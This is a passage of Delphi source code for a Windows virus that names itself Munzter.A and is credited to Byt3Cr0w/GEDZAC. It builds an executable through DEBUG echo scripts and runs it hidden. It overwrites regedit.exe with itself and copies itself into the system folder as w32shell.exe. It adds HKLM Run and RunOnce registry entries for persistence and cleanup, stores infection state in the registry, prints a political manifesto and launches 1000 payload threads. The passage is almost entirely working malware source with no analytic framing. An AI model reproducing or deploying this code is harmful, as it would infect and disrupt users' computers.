   'echo e 1090  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 10A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 10B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 10C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 10D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 10E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 10F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1100  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1110  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1120  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1130  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1140  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1150  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1160  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1170  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1180  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1190  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 11A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 11B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 11C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 11D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 11E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 11F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1200  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1210  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1220  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1230  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1240  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1250  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1260  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1270  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1280  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1290  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 12A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 12B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 12C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 12D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 12E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 12F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1300  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1310  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1320  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1330  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1340  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1350  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1360  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1370  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1380  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1390  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 13A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 13B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 13C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 13D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 13E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 13F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1400  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1410  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1420  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1430  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1440  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1450  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1460  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1470  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1480  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1490  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 14A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 14B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 14C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 14D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 14E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 14F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1500  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1510  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1520  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1530  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1540  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1550  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1560  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1570  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1580  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1590  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 15A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 15B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 15C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 15D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 15E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 15F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1600  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1610  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1620  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1630  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1640  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1650  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1660  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1670  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1680  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1690  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 16A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 16B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 16C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 16D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 16E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 16F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>munzter' + S +
   'echo e 1700  00>>munzter' + S +
   'echo rcx>>munzter' + S +
   'echo 1600>>munzter' + S +
   'echo nC:\Munzter.scr>>munzter' + S +
   'echo w>>munzter' + S +
   'echo q>>munzter' + S +
   'debug < munzter' + S +
   '@Start C:\Munzter.scr';
   if EDX = 1 then WinExec(Pchar('C:\Munzter.scr'),SW_HIDE) else
   begin
   AssignFile(EDI,'C:\munzter.bat');
   rewrite(EDI); Writeln(EDI,ebx); closefile(EDI);
   WinExec(Pchar('C:\munzter.bat'),SW_HIDE);

   CreateThread(nil,0,@stand,nil,0,MunzterA);
   end;
   end;


   function wake:integer;
   var hora,i:integer;
   begin
   Hora := Time.WHour;
   if Hora > 8 then
   begin
   Write (HKEY_CURRENT_USER,'\GEDZAC\MunzterA\','standing','1');
   Writeln('this is the beginning...');
   Sleep(1000);
   Writeln('Are you from the society?');
   Sleep(1000);
   Writeln('Are you agree with the society?');
   Sleep(1000);
   Writeln('Do you want more liberty?');
   Sleep(1000);
   Writeln('Do you want a new world?');
   Sleep(1000);
   Writeln('Are you agree with Dictatorships and less liberty?');
   Sleep(1000);
   Writeln('..is time to change..is time to forget...is time begin a new world');
   Sleep(1000);
   Writeln('I dont want to live in your world...you kill him...');
   Sleep(1000);
   Writeln('you burn forest...you drop trash in lakes..');
   Sleep(1000);
   Writeln('you are killing my world,you stupid Dictatorships you kill the liberty');
   Sleep(1000);
   Writeln('Go and play with your missiles and your bombs...and let us the world!!');
   Sleep(4000);
   WinExec(Pchar('cmd.exe /c @cls'),SW_HIDE);
   sleep(200);
   Writeln('Munzter.A inspired by NOFX');
   Writeln('created by Byt3Cr0w/GEDZAC');
   sleep(1000);
   WinExec(Pchar('cmd.exe /c @cls'),SW_HIDE);
   w:=TRegistry.create;
   w.RootKey := HKEY_CURRENT_USER;
   w.OpenKey('GEDZAC', True);
   w.OpenKey('MunzterA', True);
   w.DeleteValue('Incubando');
   w.CloseKey;
   w.OpenKey('GEDZAC', True);
   w.DeleteKey('MunzterA');
   W.Destroy;
   q:=TRegistry.create;
   q.RootKey := HKEY_LOCAL_MACHINE;
   q.OpenKey('Software', True);
   q.OpenKey('Microsoft', True);
   q.OpenKey('Windows', True);
   q.OpenKey('CurrentVersion', True);
   q.OpenKey('Run', True);
   q.deletevalue('w32Shell');
   q.CloseKey;
   q.Destroy;
   Write(HKEY_LOCAL_MACHINE,'\Software\Microsoft\Windows\CurrentVersion\RunOnce\','KernelCheck1','cmd.exe /c @del ' + folder + 'w32shell.exe');
   Write(HKEY_LOCAL_MACHINE,'\Software\Microsoft\Windows\CurrentVersion\RunOnce\','KernelCheck2','cmd.exe /c @del C:\Munzter.scr');
   Write(HKEY_LOCAL_MACHINE,'\Software\Microsoft\Windows\CurrentVersion\RunOnce\','KernelCheck3','cmd.exe /c @del C:\munzter.bat');
   for i := 1 to 1000 do begin
   CreateThread(nil,0,@payload,nil,0,MunzterA);
   end;
   end;
   end;

   function wakeorsleep:integer;
   begin
   eax := Read(HKEY_CURRENT_USER,'\GEDZAC\MunzterA\','Incubando');
   ecx := inttostr(Time.wDay);
   if eax <> ecx then CreateThread(nil,0,@wake,nil,0,MunzterA) else halt(0);
   end;


   function infest:integer;
   var cmp:string;
   begin
   cmp := inttostr(Time.wDay);
   Write(HKEY_CURRENT_USER,'\GEDZAC\MunzterA\','Incubando',cmp);
   CopyFile(Pchar(who),Pchar(folder + 'w32shell.exe'),true);
   halt(0);
   end;


   function viral:integer;
   var shh:string;
   a:textfile;
   begin
   CopyFile(Pchar(regx),Pchar('C:\rgx85.exe'),true);
   CopyFile(Pchar(who),Pchar(regx),true);
   shh := Read(HKEY_CURRENT_USER,'\GEDZAC\MunzterA\','Incubando');
   if shh <> '' then
   begin
   CreateThread(nil,0,@wakeorsleep,nil,0,MunzterA);
   end
   else
   CreateThread(nil,0,@infest,nil,0,MunzterA);
   end;




   begin

        GetlocalTime(Time);
           whox:=getcommandline;

   who2:=StrLen(pchar(whox));

   for what:=2 to (who2-2) do
   begin
   who:=who+whox[what];
   end;

   regx := sys + '\regedit.exe';
   if who = regx then
   begin
   WinExec(Pchar('C:\rgx85.exe'),SW_SHOWNORMAL);
   O := Read(HKEY_LOCAL_MACHINE,'\Software\Microsoft\Windows\CurrentVersion\Run\','w32Shell');
   if O = folder + 'w32shell.exe' then
   begin
   halt(0);
   end
   else
   begin
   CreateThread(nil,0,@viral,nil,0,MunzterA);
   end;
   end;
   OAX := Read(HKEY_CURRENT_USER,'\GEDZAC\MunzterA\','standing');
   if OAX <> '' then
   begin
   CreateThread(nil,0,@stand,nil,0,MunzterA);
   end
   else
   begin
   RET := Read(HKEY_LOCAL_MACHINE,'\Software\Microsoft\Windows\CurrentVersion\RunOnce\','KernelCheck1');
   if RET <> '' then
   begin
   d:=TRegistry.create;
   d.RootKey := HKEY_LOCAL_MACHINE;
   d.OpenKey('Software', True);
   d.OpenKey('Microsoft', True);
   d.OpenKey('Windows', True);
   d.OpenKey('CurrentVersion', True);
   d.OpenKey('RunOnce', True);
   d.deletevalue('KernelCheck1');
   d.deletevalue('KernelCheck2');
   d.deletevalue('KernelCheck3');
   d.CloseKey;
   d.Destroy;
   end;
   Write(HKEY_LOCAL_MACHINE,'\Software\Microsoft\Windows\CurrentVersion\Run\','w32Shell',folder + 'w32shell.exe');
   CreateThread(nil,0,@viral,nil,0,MunzterA);
   Sleep($FFFFFFFF);
   end;






   end.
